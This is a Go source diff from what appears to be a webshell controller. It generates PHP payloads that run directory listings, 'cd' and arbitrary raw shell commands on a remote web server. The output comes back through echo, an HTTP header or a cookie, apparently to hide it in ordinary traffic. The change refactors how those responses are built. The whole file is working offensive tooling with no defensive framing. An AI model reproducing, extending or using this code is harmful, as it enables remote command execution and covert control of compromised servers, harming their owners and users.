@@ -41,23 +41,6 @@ func (c *COMMAND) createCMD(cmd *string, r string) {
 	*cmd = shellCMD
 }
 
-func (c *COMMAND) getReturn() string {
-	var response string
-
-	m := NET.GetMethod()
-	p := NET.GetParameter()
-
-	if m == 0 || m == 1 {
-		response = "echo(" + PHPEncode("$r") + ");exit();"
-	} else if m == 2 {
-		response = "header('" + p + ":' . " + PHPEncode("$r") + ");exit();"
-	} else if m == 3 {
-		response = "setcookie('" + p + "', " + PHPEncode("$r") + ");exit();"
-	}
-
-	return response
-}
-
 func (cmd *COMMAND) Ls(c string) string {
 	var context string
 
@@ -71,7 +54,7 @@ func (cmd *COMMAND) Ls(c string) string {
 	cmd.createCMD(&lsFolder, "a")
 	cmd.createCMD(&lsFile, "b")
 
-	ls := lsFolder + lsFile + "$r=json_encode(array($a, $b));" + cmd.getReturn()
+	ls := lsFolder + lsFile + "$r=json_encode(array($a, $b));" + FORMATER.Response()
 
 	return ls
 }
@@ -79,14 +62,14 @@ func (cmd *COMMAND) Ls(c string) string {
 func (cmd *COMMAND) Cd(a string) string {
 	cd := a + " && pwd"
 	cmd.createCMD(&cd, "r")
-	cd = cd + cmd.getReturn()
+	cd = cd + FORMATER.Response()
 
 	return cd
 }
 
 func (cmd *COMMAND) Raw(r string) string {
 	cmd.createCMD(&r, "r")
-	raw := r + cmd.getReturn()
+	raw := r + FORMATER.Response()
 
 	return raw
 }
